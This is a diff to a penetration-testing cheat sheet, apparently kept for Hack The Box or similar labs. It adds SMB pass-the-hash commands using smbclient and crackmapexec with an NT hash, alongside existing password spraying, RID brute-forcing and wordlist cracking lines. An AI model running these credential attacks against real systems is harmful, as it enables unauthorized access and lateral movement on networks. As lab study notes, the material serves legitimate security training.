@@ -140,6 +140,7 @@ snmpwalk -c internal -v2c 10.10.11.193
 ## SMB
 ```bash
 smbclient -N -L \\\\10.129.144.138
+smbclient //192.168.226.248/transfer -U htb.local/user%[HASH] --pw-nt-hash
 smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
 ```
 
@@ -403,6 +404,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --rules /usr/share/john/rules/b
 ### crackmap
 ```bash
 crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+crackmapexec smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 54abdf854d8c0653b1be3458454e4a3b -d htb.local --continue-on-success
 crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
 crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
 ```
